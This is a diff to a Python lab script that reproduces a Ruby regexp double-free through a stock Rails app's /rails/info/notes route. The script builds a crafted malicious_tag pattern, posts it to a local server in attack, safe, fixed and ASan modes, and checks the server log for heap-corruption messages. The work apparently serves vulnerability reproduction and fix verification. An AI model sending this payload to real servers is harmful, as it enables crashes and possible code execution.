@@ -9,8 +9,12 @@ _method=GET reaches that GET route without Puma's 10 KiB query-string limit.
 Usage:
   python3 lab/repro/ruby2shell-regexp-notes-wire.py attack|safe|fixed|asan [tag]
 
-No application, middleware, debugger, memory oracle, or marker is used.  The
+No application, middleware, debugger, memory oracle, or marker is used. The
 only non-stock condition is selecting the affected/fixed/ASan Ruby build.
+Set RUBY2SHELL_REGEXP_RUBY to select another build and
+RUBY2SHELL_REGEXP_GEM_PATH to override its gem home. Without an override the
+matching installed gem directory is selected; the ASan mode uses the plain
+3.4.12 gem home because its native extensions are ABI-compatible.
 """
 
 from __future__ import annotations
@@ -42,7 +46,14 @@ def malicious_tag(nested_extras: int = 0) -> str:
     # 9,999 disjoint two-codepoint ranges cross ONIG_MAX_MULTI_BYTE_RANGES_NUM
     # only on the second && intersection, after cc->mbuf was freed once.
     chars = "".join(chr(0x4E00 + 2 * i) for i in range(9_999))
-    extra = "".join(f"\\u{{{0xA000 + i * 0x100:X}}}" for i in range(nested_extras))
+    extra_codepoints = []
+    codepoint = 0xA000
+    for _ in range(nested_extras):
+        while 0xD800 <= codepoint <= 0xDFFF:
+            codepoint += 0x100
+        extra_codepoints.append(codepoint)
+        codepoint += 0x100
+    extra = "".join(f"\\u{{{codepoint:X}}}" for codepoint in extra_codepoints)
     return "(?i:[[:^ascii:][^" + chars + "]&&[^\\u9fff" + extra + "]&&x])"
 
 
@@ -82,13 +93,29 @@ def main() -> int:
     if not (APP / "config/environment.rb").is_file():
         raise SystemExit("missing stock Rails app; run lab/repro/ruby2shell-stock-rails-setup.sh")
 
-    ruby = RUBY13 if mode == "fixed" else RUBY12_ASAN if mode == "asan" else RUBY12
+    ruby_override = os.environ.get("RUBY2SHELL_REGEXP_RUBY")
+    ruby = Path(ruby_override) if ruby_override else RUBY13 if mode == "fixed" else RUBY12_ASAN if mode == "asan" else RUBY12
+    if not ruby.is_absolute():
+        ruby = ROOT / ruby
     if not ruby.is_file():
         raise SystemExit(f"missing Ruby build: {ruby}")
 
     port = int(os.environ.get("RUBY2SHELL_REGEXP_PORT", "4600"))
     env = os.environ.copy()
-    gem_path = ROOT / "lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0"
+    gem_path_override = os.environ.get("RUBY2SHELL_REGEXP_GEM_PATH")
+    if gem_path_override:
+        gem_path = Path(gem_path_override)
+        if not gem_path.is_absolute():
+            gem_path = ROOT / gem_path
+    elif mode == "asan" and ruby == RUBY12_ASAN:
+        gem_path = ROOT / "lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0"
+    else:
+        gem_dirs = sorted(
+            path for path in (ruby.parent.parent / "lib/ruby/gems").glob("[0-9]*.[0-9]*.0") if path.is_dir()
+        )
+        if len(gem_dirs) != 1:
+            raise SystemExit(f"cannot select gem path for {ruby}: {gem_dirs}")
+        gem_path = gem_dirs[0]
     env["GEM_PATH"] = str(gem_path) + ((":" + env["GEM_PATH"]) if env.get("GEM_PATH") else "")
     if mode == "asan":
         env["ASAN_OPTIONS"] = "detect_leaks=0:abort_on_error=1"
@@ -110,6 +137,9 @@ def main() -> int:
     safe_prefix = int(os.environ.get("RUBY2SHELL_REGEXP_SAFE_PREFIX", "0"))
     primer_k = int(os.environ.get("RUBY2SHELL_REGEXP_PRIMER_K", "0"))
     primer = os.environ.get("RUBY2SHELL_REGEXP_PRIMER", "")
+    extra_params = int(os.environ.get("RUBY2SHELL_REGEXP_EXTRA_PARAMS", "0"))
+    extra_len = int(os.environ.get("RUBY2SHELL_REGEXP_EXTRA_LEN", "0"))
+    request_path = os.environ.get("RUBY2SHELL_REGEXP_PATH", "/rails/info/notes")
     if primer_k:
         primer = "|".join(["[[:^ascii:][^一]&&x]"] * primer_k)
     if names:
@@ -120,15 +150,23 @@ def main() -> int:
         ) + pattern
     if safe_prefix:
         pattern = "[[:^ascii:][^一]&&x]" * safe_prefix + pattern
-    trace = bool(os.environ.get("RUBY2SHELL_REGEXP_TRACE"))
+    jemtrace = bool(os.environ.get("RUBY2SHELL_REGEXP_JEMTRACE"))
+    trace = bool(os.environ.get("RUBY2SHELL_REGEXP_TRACE")) or jemtrace
     if trace:
         arm_path.unlink(missing_ok=True)
-        env["LD_PRELOAD"] = str(ROOT / "lab/preload/regtrace.so") + (
-            (":" + env["LD_PRELOAD"]) if env.get("LD_PRELOAD") else ""
-        )
-        env["REGTRACE_FD"] = "2"
-        env["REGTRACE_ARM"] = str(arm_path)
-    body = urlencode({"_method": "GET", "tag": pattern}).encode()
+        if jemtrace:
+            env["LD_PRELOAD"] = str(ROOT / "lab/preload/jemregtrace.so") + ":libjemalloc.so.2"
+            env["JEMREGTRACE_FD"] = "2"
+            env["JEMREGTRACE_ARM"] = str(arm_path)
+        else:
+            env["LD_PRELOAD"] = str(ROOT / "lab/preload/regtrace.so") + (
+                (":" + env["LD_PRELOAD"]) if env.get("LD_PRELOAD") else ""
+            )
+            env["REGTRACE_FD"] = "2"
+            env["REGTRACE_ARM"] = str(arm_path)
+    fields = [("_method", "GET"), ("tag", pattern)]
+    fields.extend((f"x{i}", "x" * extra_len) for i in range(extra_params))
+    body = urlencode(fields).encode()
     primer_body = urlencode({"_method": "GET", "tag": primer}).encode() if primer else b""
 
     command = [str(ruby), str(APP / "bin/rails"), "server", "-b", "127.0.0.1", "-p", str(port), "--pid", str(pid_path)]
@@ -146,15 +184,21 @@ def main() -> int:
         result: dict[str, object] = {
             "mode": mode,
             "tag": tag,
-            "ruby": str(ruby.relative_to(ROOT)),
+            "ruby": str(ruby.relative_to(ROOT)) if ruby.is_relative_to(ROOT) else str(ruby),
             "port": port,
+            "ruby_override": ruby_override,
+            "gem_path": str(gem_path.relative_to(ROOT)) if gem_path.is_relative_to(ROOT) else str(gem_path),
             "names": names,
             "name_len": name_len,
             "safe_prefix": safe_prefix,
             "nested_extras": nested_extras,
             "primer_k": primer_k,
             "primer_bytes": len(primer.encode()),
+            "extra_params": extra_params,
+            "extra_len": extra_len,
+            "request_path": request_path,
             "trace": trace,
+            "jemtrace": jemtrace,
             "tcache0": bool(os.environ.get("RUBY2SHELL_REGEXP_TCACHE0")),
             "aslr_off": bool(os.environ.get("RUBY2SHELL_REGEXP_ASLR_OFF")),
             "pattern_bytes": len(pattern.encode()),
@@ -175,7 +219,7 @@ def main() -> int:
                     if primer:
                         conn.request(
                             "POST",
-                            "/rails/info/notes",
+                            request_path,
                             body=primer_body,
                             headers={
                                 "Content-Type": "application/x-www-form-urlencoded",
@@ -188,7 +232,7 @@ def main() -> int:
                         result["primer_response_bytes"] = len(primer_data)
                     conn.request(
                         "POST",
-                        "/rails/info/notes",
+                        request_path,
                         body=body,
                         headers={
                             "Content-Type": "application/x-www-form-urlencoded",
@@ -231,7 +275,17 @@ def main() -> int:
         ok = (
             result.get("request_error") is not None
             and result.get("exit_after_request") not in (None, 0)
-            and ("bbuf_free" in server_log or "double free" in server_log or "corrupted" in server_log)
+            and any(
+                diagnostic in server_log
+                for diagnostic in (
+                    "bbuf_free",
+                    "double free",
+                    "corrupted",
+                    "free(): invalid size",
+                    "free(): invalid pointer",
+                    "munmap_chunk(): invalid pointer",
+                )
+            )
         )
     elif mode == "safe":
         ok = result.get("http_status") == 200 and result.get("health") == 200
